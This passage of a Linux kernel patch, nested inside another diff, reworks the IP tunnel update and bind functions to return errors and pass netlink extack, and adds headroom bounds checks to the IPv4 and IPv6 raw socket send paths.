+-			     struct ip_tunnel_parm_kern *p,
+-			     bool set_mtu,
+-			     __u32 fwmark)
++static int ip_tunnel_update(struct ip_tunnel_net *itn,
++			    struct ip_tunnel *t, struct net_device *dev,
++			    struct ip_tunnel_parm_kern *p, bool set_mtu,
++			    __u32 fwmark, struct netlink_ext_ack *extack)
+ {
++	unsigned int needed_headroom;
++	int mtu;
++	int err;
++
++	err = ip_tunnel_calc_dev_config(dev, p, fwmark, &needed_headroom,
++					&mtu, extack);
++	if (err)
++		return err;
++
+ 	ip_tunnel_del(itn, t);
+ 	t->parms.iph.saddr = p->iph.saddr;
+ 	t->parms.iph.daddr = p->iph.daddr;
+@@ -880,18 +927,15 @@ static void ip_tunnel_update(struct ip_tunnel_net *itn,
+ 	t->parms.iph.ttl = p->iph.ttl;
+ 	t->parms.iph.tos = p->iph.tos;
+ 	t->parms.iph.frag_off = p->iph.frag_off;
+-
+-	if (t->parms.link != p->link || t->fwmark != fwmark) {
+-		int mtu;
+-
+-		WRITE_ONCE(t->parms.link, p->link);
+-		t->fwmark = fwmark;
+-		mtu = ip_tunnel_bind_dev(dev);
+-		if (set_mtu)
+-			WRITE_ONCE(dev->mtu, mtu);
+-	}
++	WRITE_ONCE(t->parms.link, p->link);
++	t->fwmark = fwmark;
++	dev->needed_headroom = needed_headroom;
++	if (set_mtu)
++		WRITE_ONCE(dev->mtu, mtu);
+ 	dst_cache_reset(&t->dst_cache);
+ 	netdev_state_change(dev);
++
++	return 0;
+ }
+ 
+ int ip_tunnel_ctl(struct net_device *dev, struct ip_tunnel_parm_kern *p,
+@@ -962,8 +1006,7 @@ int ip_tunnel_ctl(struct net_device *dev, struct ip_tunnel_parm_kern *p,
+ 		}
+ 
+ 		if (t) {
+-			err = 0;
+-			ip_tunnel_update(itn, t, dev, p, true, 0);
++			err = ip_tunnel_update(itn, t, dev, p, true, 0, NULL);
+ 		} else {
+ 			err = -ENOENT;
+ 		}
+@@ -1128,6 +1171,7 @@ int ip_tunnel_init_net(struct net *net, unsigned int ip_tnl_net_id,
+ 	struct ip_tunnel_net *itn = net_generic(net, ip_tnl_net_id);
+ 	struct ip_tunnel_parm_kern parms;
+ 	unsigned int i;
++	int mtu;
+ 
+ 	itn->rtnl_link_ops = ops;
+ 	for (i = 0; i < IP_TNL_HASH_SIZE; i++)
+@@ -1153,9 +1197,11 @@ int ip_tunnel_init_net(struct net *net, unsigned int ip_tnl_net_id,
+ 	 */
+ 	if (!IS_ERR(itn->fb_tunnel_dev)) {
+ 		itn->fb_tunnel_dev->netns_immutable = true;
+-		itn->fb_tunnel_dev->mtu = ip_tunnel_bind_dev(itn->fb_tunnel_dev);
+-		ip_tunnel_add(itn, netdev_priv(itn->fb_tunnel_dev));
+-		itn->type = itn->fb_tunnel_dev->type;
++		if (!ip_tunnel_bind_dev(itn->fb_tunnel_dev, &mtu, NULL)) {
++			itn->fb_tunnel_dev->mtu = mtu;
++			ip_tunnel_add(itn, netdev_priv(itn->fb_tunnel_dev));
++			itn->type = itn->fb_tunnel_dev->type;
++		}
+ 	}
+ 	rtnl_unlock();
+ 
+@@ -1194,7 +1240,7 @@ EXPORT_SYMBOL_GPL(ip_tunnel_delete_net);
+ 
+ int ip_tunnel_newlink(struct net *net, struct net_device *dev,
+ 		      struct nlattr *tb[], struct ip_tunnel_parm_kern *p,
+-		      __u32 fwmark)
++		      __u32 fwmark, struct netlink_ext_ack *extack)
+ {
+ 	struct ip_tunnel *nt;
+ 	struct ip_tunnel_net *itn;
+@@ -1222,7 +1268,9 @@ int ip_tunnel_newlink(struct net *net, struct net_device *dev,
+ 	if (dev->type == ARPHRD_ETHER && !tb[IFLA_ADDRESS])
+ 		eth_hw_addr_random(dev);
+ 
+-	mtu = ip_tunnel_bind_dev(dev);
++	err = ip_tunnel_bind_dev(dev, &mtu, extack);
++	if (err)
++		goto err_dev_set_mtu;
+ 	if (tb[IFLA_MTU]) {
+ 		unsigned int max = IP_MAX_MTU - (nt->hlen + sizeof(struct iphdr));
+ 
+@@ -1247,7 +1295,8 @@ int ip_tunnel_newlink(struct net *net, struct net_device *dev,
+ EXPORT_SYMBOL_GPL(ip_tunnel_newlink);
+ 
+ int ip_tunnel_changelink(struct net_device *dev, struct nlattr *tb[],
+-			 struct ip_tunnel_parm_kern *p, __u32 fwmark)
++			 struct ip_tunnel_parm_kern *p, __u32 fwmark,
++			 struct netlink_ext_ack *extack)
+ {
+ 	struct ip_tunnel *t;
+ 	struct ip_tunnel *tunnel = netdev_priv(dev);
+@@ -1279,8 +1328,7 @@ int ip_tunnel_changelink(struct net_device *dev, struct nlattr *tb[],
+ 		}
+ 	}
+ 
+-	ip_tunnel_update(itn, t, dev, p, !tb[IFLA_MTU], fwmark);
+-	return 0;
++	return ip_tunnel_update(itn, t, dev, p, !tb[IFLA_MTU], fwmark, extack);
+ }
+ EXPORT_SYMBOL_GPL(ip_tunnel_changelink);
+ 
+diff --git a/net/ipv4/ip_vti.c b/net/ipv4/ip_vti.c
+index 3b8092999..18b6382b4 100644
+--- a/net/ipv4/ip_vti.c
++++ b/net/ipv4/ip_vti.c
+@@ -585,7 +585,7 @@ static int vti_newlink(struct net_device *dev,
+ 
+ 	vti_netlink_parms(data, &parms, &fwmark);
+ 	return ip_tunnel_newlink(params->link_net ? : dev_net(dev), dev, tb,
+-				 &parms, fwmark);
++				 &parms, fwmark, extack);
+ }
+ 
+ static int vti_changelink(struct net_device *dev, struct nlattr *tb[],
+@@ -600,7 +600,7 @@ static int vti_changelink(struct net_device *dev, struct nlattr *tb[],
+ 		return -EPERM;
+ 
+ 	vti_netlink_parms(data, &p, &fwmark);
+-	return ip_tunnel_changelink(dev, tb, &p, fwmark);
++	return ip_tunnel_changelink(dev, tb, &p, fwmark, extack);
+ }
+ 
+ static size_t vti_get_size(const struct net_device *dev)
+diff --git a/net/ipv4/ipip.c b/net/ipv4/ipip.c
+index b643194f5..1684a81a9 100644
+--- a/net/ipv4/ipip.c
++++ b/net/ipv4/ipip.c
+@@ -481,7 +481,7 @@ static int ipip_newlink(struct net_device *dev,
+ 
+ 	ipip_netlink_parms(data, &p, &t->collect_md, &fwmark);
+ 	return ip_tunnel_newlink(params->link_net ? : dev_net(dev), dev, tb, &p,
+-				 fwmark);
++				 fwmark, extack);
+ }
+ 
+ static int ipip_changelink(struct net_device *dev, struct nlattr *tb[],
+@@ -512,7 +512,7 @@ static int ipip_changelink(struct net_device *dev, struct nlattr *tb[],
+ 	    (!(dev->flags & IFF_POINTOPOINT) && p.iph.daddr))
+ 		return -EINVAL;
+ 
+-	return ip_tunnel_changelink(dev, tb, &p, fwmark);
++	return ip_tunnel_changelink(dev, tb, &p, fwmark, extack);
+ }
+ 
+ static size_t ipip_get_size(const struct net_device *dev)
+diff --git a/net/ipv4/raw.c b/net/ipv4/raw.c
+index 7f74d8b95..8e6e8c684 100644
+--- a/net/ipv4/raw.c
++++ b/net/ipv4/raw.c
+@@ -43,6 +43,7 @@
+ #include <linux/slab.h>
+ #include <linux/errno.h>
+ #include <linux/kernel.h>
++#include <linux/limits.h>
+ #include <linux/export.h>
+ #include <linux/spinlock.h>
+ #include <linux/sockios.h>
+@@ -356,6 +357,8 @@ static int raw_send_hdrinc(struct sock *sk, struct flowi4 *fl4,
+ 		goto out;
+ 
+ 	hlen = LL_RESERVED_SPACE(rt->dst.dev);
++	if (hlen >= U16_MAX - (sizeof(struct iphdr) + MAX_IPOPTLEN))
++		return -EINVAL;
+ 	tlen = rt->dst.dev->needed_tailroom;
+ 	skb = sock_alloc_send_skb(sk,
+ 				  length + hlen + tlen + 15,
+diff --git a/net/ipv6/raw.c b/net/ipv6/raw.c
+index b88d364e7..fa223ec02 100644
+--- a/net/ipv6/raw.c
++++ b/net/ipv6/raw.c
+@@ -15,6 +15,7 @@
+  */
+ 
+ #include <linux/errno.h>
++#include <linux/limits.h>
+ #include <linux/types.h>
+ #include <linux/socket.h>
+ #include <linux/slab.h>
+@@ -613,6 +614,9 @@ static int rawv6_send_hdrinc(struct sock *sk, struct msghdr *msg, int length,
+ 	if (flags&MSG_PROBE)
+ 		goto out;
+ 
++	if (hlen >= U16_MAX)
++		return -EINVAL;
++
+ 	skb = sock_alloc_send_skb(sk,
+ 				  length + hlen + tlen + 15,
+ 				  flags & MSG_DONTWAIT, &err);
 -- 
 2.43.0
 
